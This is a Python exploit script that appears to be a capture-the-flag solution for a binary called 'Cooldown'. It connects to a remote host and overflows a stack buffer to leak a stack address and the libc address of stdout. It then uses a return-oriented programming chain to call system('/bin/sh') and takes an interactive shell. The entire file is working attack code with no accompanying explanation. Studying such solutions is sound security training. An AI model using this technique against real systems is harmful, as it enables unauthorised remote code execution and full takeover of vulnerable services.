from ptrlib import *
import time

libc = ELF("./libc.so.6")
elf = ELF("./Cooldown")

rop_mov_edi_1_call_write_mov_rsi_rbx_mov_edx_60h_xor_edi_edi_xor_eax_eax_call_read_add_rsp_30h_pop_rbx = 0x40055d
rop_call_prbxP31h = 0x0040053c
addr_stdout = 0x601000
addr_main = 0x40053d

while True:
    #sock = Socket("localhost", 9999)
    #sock = Socket("localhost", 10005)
    sock = Socket("nc 141.164.48.191 10005")

    # leak stack
    payload  = b"A" * 0x30
    payload += p64(0xdeadbeefcafebabe) # rbp
    payload += p64(elf.plt("write"))
    payload += p64(addr_main)
    sock.sendafter("> ", payload)
    addr_stack = (u64(sock.recvonce(0x60)[0x50:0x58]) & ~0xf) - 0x18e8
    logger.info("guesstack = " + hex(addr_stack))

    # 
    payload  = b"A" * 0x30
    payload += p64(addr_stack + 0x30) # rbp
    payload += p64(0x400567)
    payload += b'X' * (0x60 - len(payload))
    sock.sendafter("> ", payload)

    payload  = p64(addr_stdout)
    payload += p64(0x400567)
    payload += b'A' * 0x30
    payload += p64(0xcafe)
    payload += p64(elf.plt("write"))
    payload += p64(addr_main)
    payload += b'X' * (0x60 - len(payload))
    sock.send(payload)

    sock.send("\x60")
    try:
        l = sock.recvonce(0x60, timeout=1)
        if l == b'':
            print("piyo")
            sock.close()
            continue
    except TimeoutError:
        sock.close()
        continue
    except ConnectionResetError:
        sock.close()
        continue
    print(l)
    sock.sh()
    libc_base = u64(l[0:8]) - libc.symbol("_IO_2_1_stdout_")
    libc.set_base(libc_base)

    rop_pop_rdi = libc_base + 0x000215bf

    payload  = b"A" * 0x30
    payload += p64(0) # rbp
    payload += p64(rop_pop_rdi)
    payload += p64(next(libc.find("/bin/sh")))
    payload += p64(libc.symbol("system"))
    payload += b'X' * (0x60 - len(payload))
    sock.sendafter("> ", payload)

    sock.interactive()
